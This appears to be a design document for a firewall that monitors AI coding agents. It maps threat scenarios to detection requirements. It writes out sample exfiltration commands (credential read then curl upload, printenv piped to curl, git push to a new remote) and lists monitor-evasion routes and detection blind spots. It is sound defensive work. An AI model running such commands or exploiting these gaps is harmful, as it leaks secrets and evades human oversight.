# Detection requirements from the threat catalogue

`docs/DETECTION-RESEARCH.md` asks which operating-system mechanism the monitor
should use, and answers it with measurements. This document asks a different
question, and the threat research answers it:

> **What must the firewall be able to observe, and to remember, before the
> known attack vectors can be expressed at all?**

The source is `research/threats/`: 57 incident reports and 147 scenarios. Each
scenario states its signal only in terms the monitor could plausibly deliver.
Read together, the 147 signals are a requirements specification. This document
is that specification.

---

## 1. The result in one table

Every scenario needs two things to become a rule: an **observable**, which is
an event the monitor produces, and sometimes **memory**, which is knowledge of
what happened earlier in the session.

| | rule sees one action | rule needs session memory |
| --- | ---: | ---: |
| **`exec` and `input` only** | **57 buildable today** | 20 |
| **needs `file_open` or `network_connect`** | 42 | 28 |

Read the three blocked cells as three separate investments:

| investment | unlocks alone | unlocks with the other | kind of work |
| --- | ---: | ---: | --- |
| **Session memory in the engine** | **20** | 48 | pure software, no kernel |
| **New OS observables** | 42 | 70 | kernel mechanism, has a cost |
| Both together | — | 90 of 147 | |

**This is the finding that changes the roadmap.** Before this analysis the
whole plan was about the operating system. But 20 scenarios need no new
observable at all — only a policy engine that remembers. That work has no
kernel risk, no performance cost, no `no_new_privs` trade-off, and no
privileged tier. It is the cheapest coverage available, and nothing in
`docs/DETECTION-RESEARCH.md` mentions it.

At severity 5, the 28 worst scenarios split the same way: 11 buildable today,
5 need memory only, 6 need an observable only, 6 need both.

---

## 2. Requirement group A — observables the monitor must produce

The monitor makes two action kinds today: `exec` and `input`. The catalogue
demands two more.

| observable | scenarios | what it must carry |
| --- | ---: | --- |
| `file_open` | 58 | path, and whether the process opened it to write |
| `network_connect` | 19 | destination address, port, and host name when known |

`docs/DETECTION-RESEARCH.md` already recommends the mechanism:
`seccomp RET_TRACE` delivers exactly these two for about 1.2× cost, and keeps
the whole existing monitor design. This document adds the demand side of that
decision: **48% of the known attack vectors need them.**

Two axes are almost entirely blocked without them:

| axis | scenarios | blocked on an observable |
| --- | ---: | ---: |
| `exfil` | 15 | 12 |
| `secrets` | 15 | 12 |

That is why the firewall today is strong against a destructive command and
weak against data leaving the machine. `policies/` already holds 7 rules
written against these observables. They have never fired.
`agent-firewall policy list` marks them `(inactive)`.

### A.1 Detail the observables must carry

The scenarios ask for more than the event name.

* **Write intent, not only the open.** Most file rules only care about a
  write. A filter that reports a read as well multiplies the traffic. The
  `seccomp` research measured this exactly: trapping only write-intent opens
  costs 1.16×, and trapping every open costs 1.92×. **The observable must
  carry write intent, and the filter should select on it in the kernel.**
* **The resolved path.** A rule about `~/.ssh/id_rsa` must not be defeated by
  a relative path or a symbolic link. `evade-13` is a scenario about exactly
  that.
* **The host name for a connection, when it is known.** An address alone
  cannot express "a host that is not the package registry".

### A.2 One observable the catalogue asks for that we should refuse

Three scenarios want the content of a file write or of a network body. The
`seccomp` research measured the cost of trapping `write`: a `dd` workload went
from 52 ms to 422 ms, which is **8.1×**. That breaks the product for a signal
that argv and `input` already give in most real cases. **Do not trap `write`.**

---

## 3. Requirement group B — memory the engine must keep

This group is new. It is not in the detection research, and it is invisible in
the code today.

`af_core::EvalContext` carries exactly one action, and
`PolicyEngine::evaluate(&self, ...)` takes an immutable engine. **No rule can
refer to anything that happened earlier.** So every scenario below is
currently inexpressible, whatever the monitor observes.

The 48 scenarios that need memory ask for six primitives.

### B.1 A follows B — the chain

The strongest signal in the whole catalogue, and the shape behind nearly every
real incident.

| chain | scenario |
| --- | --- |
| read a credential file → send data out | `exfil` credential read then egress (severity 5) |
| write a file → make it executable → run it | `evade-05` payload assembly |
| create a link → delete through it | `fs` symbolic-link delete |
| open a tunnel → connect to `localhost` | `exfil` tunnel then local client |
| read many records → write a large blob back | `mcp` read-then-write-back (severity 5) |

Neither half is dangerous alone. `cat ~/.aws/credentials` is something a
developer does. `curl -T file host` is something a developer does. **The pair,
inside one session and one ancestry, is not.** A rule that fires on either
half alone would fail the interruption-budget test in `docs/PRODUCT.md`
section 5, which is exactly why these scenarios have no rule today.

Requirement: the engine must be able to mark a fact about a process subtree
and match a later action against it, inside one session, with a bound on how
long the mark lives.

**Verified against the shipping binary.** A trace with both halves of the
credential chain, replayed through the full 139-rule pack:

```
exec  cat /home/dev/.aws/credentials
exec  curl -T report.txt https://files.example.com/u

2 exec event(s) evaluated, 0 rule match(es)
```

Not one rule fires, and no rule should. Each half on its own is ordinary work.
The pack cannot see the pair, so the whole vector is silent.

### B.2 A count over a sliding window

| count | scenario |
| --- | --- |
| more than 20 delete-type execs in 60 seconds | `fs` delete burst (severity 5) |
| more than 30 API calls a minute to one host | `behavior` retry storm |
| many unique sub-domains under one domain | `exfil` data in DNS labels |
| the same command signature repeated | `behavior` retry escalation |

A single `rm` is normal. Twenty in a minute is a runaway loop. The rate **is**
the signal, and no single-action rule can see it.

Requirement: a counter for each rule and each session, over a time window that
the rule declares.

**Verified.** Twenty `rm -rf ./tmp-N` execs inside the work tree, replayed
through the full pack, produce **no match at all**. Each delete is correct on
its own, and correctly quiet. The runaway loop is invisible.

### B.3 First seen, against the state at launch

| delta | scenario |
| --- | --- |
| a git remote that did not exist when the session started | `exfil` push to a new remote (Shai-Hulud 2.0) |
| an MCP server seen for the first time | `mcp` first-seen server |
| a package that the manifest does not list | `supply` manifest against install |

`git push origin main` is the most ordinary command there is. `git remote add
backup <url> && git push --all backup` is an exfiltration channel. **The only
difference is whether the remote existed before the agent started.**

Requirement: the launcher records a small baseline at session start — git
remotes, the package manifest, the configured MCP servers — and a rule can ask
whether a value is new.

**Verified.** `git remote add backup <url>` followed by `git push --all
backup`, replayed through the full pack, gives **one report-only match** on
the `remote add` and **nothing at all** on the push. The push is the step that
moves the repository off the machine, and it is the step no rule can judge,
because judging it needs the baseline.

### B.4 How many different things — cardinality

| set | scenario |
| --- | --- |
| three or more distinct credential stores read in one session | `secrets` credential fan-out |
| several sibling sessions writing one work tree | `behavior` parallel sessions |

Reading `~/.aws/credentials` is normal for someone working on AWS. Reading the
AWS, GCP, Kubernetes, npm and SSH stores in five minutes is a sweep. This is
the Shai-Hulud and Team PCP shape.

Requirement: a set for each rule and each session, and a threshold on its
size.

### B.5 Identity the firewall owns

`evade-07` says it directly: *"monitor identity is session state the firewall
owns"*.

To answer "did the agent try to kill the monitor?" a rule must know which
process identifiers are the monitor, the session root and the sibling
sessions. Today a rule can only match the *name* in argv, which any rename
defeats.

Requirement: the session exposes its own identity — the monitor process, the
session root, the live sibling sessions — as facts a rule can match.

### B.6 Liveness and teardown

| question | scenario |
| --- | --- |
| did a process outlive the session? | `behavior` detached daemons |
| did a killed subtree come back? | `behavior` background agents resurrect |
| did the agent escape its own ancestry? | `evade-08` setsid, nohup, double fork |

Requirement: the session observes its own end and can compare the process
tree at that moment against what it started.

### B.7 Two things the engine must be given, not compute

* **Allowlists that belong to the project**, not to the rule pack: the
  project's own S3 buckets, its own git remotes, its own registries. The
  network thread reported that `aws s3 cp` and `scp` can only be judged by
  destination, and that without such a list a rule has to gate on the source
  path instead. That is a weaker rule than the threat deserves.
* **Pipeline grouping.** `printenv | curl --data-binary @-` is caught today
  only because the shell put the whole pipeline in one `-c` argument. The same
  pipeline written across separate `exec` events is invisible. Six scenarios
  depend on this.

---

## 4. What to build, in order

| order | work | unlocks | cost | risk |
| --- | --- | ---: | --- | --- |
| **1** | Session memory in the engine (B.1–B.4) | **20 now, 48 later** | software only | low |
| **2** | `file_open` with write intent (A) | 42 with the above | ~1.2× | medium |
| **3** | `network_connect` (A) | included above | ~1.2× | medium |
| 4 | Session identity and liveness (B.5, B.6) | hardens the rest | software only | low |
| 5 | Project allowlists and pipeline grouping (B.7) | strengthens ~11 | software plus config | low |

**Session memory comes first**, and that is a change from the earlier plan. It
unlocks 20 scenarios on its own, it needs no kernel mechanism, it costs no
measurable time, it cannot break `sudo`, and it needs no privileged tier. It
also raises the value of step 2: the observables unlock 42 alone but 70 when
the engine can remember.

There is a second reason to do it first. Section B.1 shows that the chain is
what separates a dangerous action from a normal one. Without memory, every
rule about a credential or an upload must fire on one half of a chain, and
half a chain is an everyday command. **Memory is what lets the firewall be
strict about real attacks and quiet about normal work at the same time** — the
central tension of `docs/PRODUCT.md` section 5.

### An engine change this implies

`PolicyEngine::evaluate(&self, ctx)` must gain access to a session store. The
smallest change that carries every primitive above:

* `EvalContext` gains a read view of session memory: marks, counters, sets,
  the launch baseline, and the session's own identity.
* The engine gains a way to record a fact after a decision.
* Both must stay deterministic. A replay of a trace must give the same answer
  as the live session, because `docs/PRODUCT.md` requires determinism and
  `af-recorder` already proves trace replay works. **A counter over a time
  window must therefore use the recorded event time, never the clock.**

---

## 5. What stays invisible

Honest limits. No mechanism in any layer reports these.

| behaviour | why |
| --- | --- |
| `io_uring` batch input and output | The operations make no system call that a per-call monitor sees. `evade-15`. |
| Content in a pipe or a socket | Nothing is stored, so there is nothing to read. `docs/RESEARCH.md` section 6. |
| An action rendered by the editor, not the agent | `exfil` markdown image fetch: no process of the session ever runs. |
| Anything decided from a path in target memory | Wrong 47.6% of the time. `docs/DETECTION-RESEARCH.md` section 2. |

The last row is a constraint on every requirement above. A `file_open`
observable used for an **allow** decision must name a kernel object, not a
pointer into the program being judged.

---

## 6. Method

The numbers come from parsing the `signal:` line of all 147 scenarios in
`research/threats/scenarios/`, and classifying each one by the observable it
names and by whether it refers to earlier events. `research/threats/LEDGER.md`
holds the per-axis breakdown. The classification is reproducible: the same
parse of the same files gives the same table.
